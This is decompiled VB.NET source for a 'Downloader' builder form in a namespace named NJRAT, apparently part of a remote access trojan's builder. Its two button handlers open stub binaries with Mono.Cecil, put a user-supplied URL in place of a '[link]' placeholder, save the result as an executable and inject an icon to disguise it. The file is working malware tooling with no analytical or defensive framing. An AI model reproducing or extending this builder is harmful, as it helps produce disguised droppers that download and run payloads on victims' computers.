Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports InjectIcon
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports Mono.Collections.Generic

Namespace NJRAT
	' Token: 0x0200000D RID: 13
	<DesignerGenerated()>
	Public Partial Class Downloader
		Inherits Form

		' Token: 0x06000149 RID: 329 RVA: 0x000029F5 File Offset: 0x00000BF5
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Downloader_Load
			Downloader.__ENCAddToList(Me)
			Me.openFileDialog_0 = New OpenFileDialog()
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600014A RID: 330 RVA: 0x0000BAB4 File Offset: 0x00009CB4
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Downloader.__ENCList
			SyncLock _ENCList
				If Downloader.__ENCList.Count = Downloader.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Downloader.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Downloader.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Downloader.__ENCList(num) = Downloader.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Downloader.__ENCList.RemoveRange(num, Downloader.__ENCList.Count - num)
					Downloader.__ENCList.Capacity = Downloader.__ENCList.Count
				End If
				Downloader.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700007D RID: 125
		' (get) Token: 0x0600014D RID: 333 RVA: 0x0000C29C File Offset: 0x0000A49C
		' (set) Token: 0x0600014E RID: 334 RVA: 0x00002A27 File Offset: 0x00000C27
		Friend Overridable Property GroupBox1 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox1 = value
			End Set
		End Property

		' Token: 0x1700007E RID: 126
		' (get) Token: 0x0600014F RID: 335 RVA: 0x0000C2B4 File Offset: 0x0000A4B4
		' (set) Token: 0x06000150 RID: 336 RVA: 0x0000C2CC File Offset: 0x0000A4CC
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700007F RID: 127
		' (get) Token: 0x06000151 RID: 337 RVA: 0x0000C324 File Offset: 0x0000A524
		' (set) Token: 0x06000152 RID: 338 RVA: 0x00002A30 File Offset: 0x00000C30
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x17000080 RID: 128
		' (get) Token: 0x06000153 RID: 339 RVA: 0x0000C33C File Offset: 0x0000A53C
		' (set) Token: 0x06000154 RID: 340 RVA: 0x00002A39 File Offset: 0x00000C39
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x17000081 RID: 129
		' (get) Token: 0x06000155 RID: 341 RVA: 0x0000C354 File Offset: 0x0000A554
		' (set) Token: 0x06000156 RID: 342 RVA: 0x00002A42 File Offset: 0x00000C42
		Friend Overridable Property GroupBox2 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox2 = value
			End Set
		End Property

		' Token: 0x17000082 RID: 130
		' (get) Token: 0x06000157 RID: 343 RVA: 0x0000C36C File Offset: 0x0000A56C
		' (set) Token: 0x06000158 RID: 344 RVA: 0x0000C384 File Offset: 0x0000A584
		Friend Overridable Property Button2 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button2_Click
				If Me._Button2 IsNot Nothing Then
					RemoveHandler Me._Button2.Click, value2
				End If
				Me._Button2 = value
				If Me._Button2 IsNot Nothing Then
					AddHandler Me._Button2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000083 RID: 131
		' (get) Token: 0x06000159 RID: 345 RVA: 0x0000C3DC File Offset: 0x0000A5DC
		' (set) Token: 0x0600015A RID: 346 RVA: 0x00002A4B File Offset: 0x00000C4B
		Friend Overridable Property TextBox2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox2 = value
			End Set
		End Property

		' Token: 0x17000084 RID: 132
		' (get) Token: 0x0600015B RID: 347 RVA: 0x0000C3F4 File Offset: 0x0000A5F4
		' (set) Token: 0x0600015C RID: 348 RVA: 0x00002A54 File Offset: 0x00000C54
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x17000085 RID: 133
		' (get) Token: 0x0600015D RID: 349 RVA: 0x0000C40C File Offset: 0x0000A60C
		' (set) Token: 0x0600015E RID: 350 RVA: 0x00002A5D File Offset: 0x00000C5D
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x17000086 RID: 134
		' (get) Token: 0x0600015F RID: 351 RVA: 0x0000C424 File Offset: 0x0000A624
		' (set) Token: 0x06000160 RID: 352 RVA: 0x00002A66 File Offset: 0x00000C66
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x06000161 RID: 353 RVA: 0x0000C43C File Offset: 0x0000A63C
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Try
				Dim assemblyDefinition As AssemblyDefinition = AssemblyDefinition.ReadAssembly("Stubs\dlnormal.bin")
				Try
					For Each typeDefinition As TypeDefinition In assemblyDefinition.MainModule.GetTypes()
						Try
							For Each methodDefinition As MethodDefinition In typeDefinition.Methods
								If Operators.CompareString(methodDefinition.Name, ".cctor", False) = 0 Then
									Dim enumerator3 As IEnumerator(Of Instruction) = CType(methodDefinition.Body.Instructions.GetEnumerator(), IEnumerator(Of Instruction))
									While enumerator3.MoveNext()
										Dim instruction As Instruction = enumerator3.Current
										If instruction.OpCode.Code <> Code.Ldstr Then
											GoTo IL_B8
										End If
										If Operators.CompareString(instruction.Operand.ToString(), "[link]", False) <> 0 Then
											GoTo IL_B8
										End If
										Dim flag As Boolean = True
										IL_B9:
										If flag Then
											instruction.Operand = Me.TextBox1.Text
											Continue While
										End If
										Continue While
										IL_B8:
										flag = False
										GoTo IL_B9
									End While
								End If
							Next
						Finally
							Dim enumerator2 As Collection(Of MethodDefinition).Enumerator
							CType(enumerator2, IDisposable).Dispose()
						End Try
					Next
				Finally
					Dim enumerator As IEnumerator(Of TypeDefinition)
					If enumerator IsNot Nothing Then
						enumerator.Dispose()
					End If
				End Try
				Dim saveFileDialog As SaveFileDialog = New SaveFileDialog() With { .Filter = "(.exe) |*.exe", .FileName = "Downloader" }
				If saveFileDialog.ShowDialog() = DialogResult.OK Then
					Try
						assemblyDefinition.Write(saveFileDialog.FileName)
						Try
							IconInjector.InjectIcon(saveFileDialog.FileName, Me.openFileDialog_0.FileName)
						Catch ex As Exception
						End Try
					Catch ex2 As Exception
						assemblyDefinition.Write(saveFileDialog.FileName)
					End Try
					Interaction.MsgBox("File : " + saveFileDialog.FileName, MsgBoxStyle.Information, "Build")
				End If
			Catch ex3 As Exception
				MessageBox.Show("Building failed !", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
			End Try
		End Sub

		' Token: 0x06000162 RID: 354 RVA: 0x0000C698 File Offset: 0x0000A898
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			Try
				Dim assemblyDefinition As AssemblyDefinition = AssemblyDefinition.ReadAssembly("Stubs\dlentrypoint.bin")
				Try
					For Each typeDefinition As TypeDefinition In assemblyDefinition.MainModule.GetTypes()
						Try
							For Each methodDefinition As MethodDefinition In typeDefinition.Methods
								If Operators.CompareString(methodDefinition.Name, ".cctor", False) = 0 Then
									Dim enumerator3 As IEnumerator(Of Instruction) = CType(methodDefinition.Body.Instructions.GetEnumerator(), IEnumerator(Of Instruction))
									While enumerator3.MoveNext()
										Dim instruction As Instruction = enumerator3.Current
										If instruction.OpCode.Code <> Code.Ldstr Then
											GoTo IL_B8
										End If
										If Operators.CompareString(instruction.Operand.ToString(), "[link]", False) <> 0 Then
											GoTo IL_B8
										End If
										Dim flag As Boolean = True
										IL_B9:
										If flag Then
											instruction.Operand = Me.TextBox2.Text
											Continue While
										End If
										Continue While
										IL_B8:
										flag = False
										GoTo IL_B9
									End While
								End If
							Next
						Finally
							Dim enumerator2 As Collection(Of MethodDefinition).Enumerator
							CType(enumerator2, IDisposable).Dispose()
						End Try
					Next
				Finally
					Dim enumerator As IEnumerator(Of TypeDefinition)
					If enumerator IsNot Nothing Then
						enumerator.Dispose()
					End If
				End Try
				Dim saveFileDialog As SaveFileDialog = New SaveFileDialog() With { .Filter = "(.exe) |*.exe", .FileName = "Downloader" }
				If saveFileDialog.ShowDialog() = DialogResult.OK Then
					Try
						assemblyDefinition.Write(saveFileDialog.FileName)
						Try
							IconInjector.InjectIcon(saveFileDialog.FileName, Me.openFileDialog_0.FileName)
						Catch ex As Exception
						End Try
					Catch ex2 As Exception
						assemblyDefinition.Write(saveFileDialog.FileName)
					End Try
					Interaction.MsgBox("File : " + saveFileDialog.FileName, MsgBoxStyle.Information, "Build")
				End If
			Catch ex3 As Exception
				MessageBox.Show("Building failed !", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
			End Try
		End Sub

		' Token: 0x06000163 RID: 355 RVA: 0x00002A6F File Offset: 0x00000C6F
		Private Sub Downloader_Load(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x04000095 RID: 149
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000097 RID: 151
		<AccessedThroughProperty("GroupBox1")>
		Private _GroupBox1 As GroupBox

		' Token: 0x04000098 RID: 152
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000099 RID: 153
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x0400009A RID: 154
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x0400009B RID: 155
		<AccessedThroughProperty("GroupBox2")>
		Private _GroupBox2 As GroupBox

		' Token: 0x0400009C RID: 156
		<AccessedThroughProperty("Button2")>
		Private _Button2 As Button

		' Token: 0x0400009D RID: 157
		<AccessedThroughProperty("TextBox2")>
		Private _TextBox2 As TextBox

		' Token: 0x0400009E RID: 158
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x0400009F RID: 159
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x040000A0 RID: 160
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x040000A1 RID: 161
		Private openFileDialog_0 As OpenFileDialog
	End Class
End Namespace
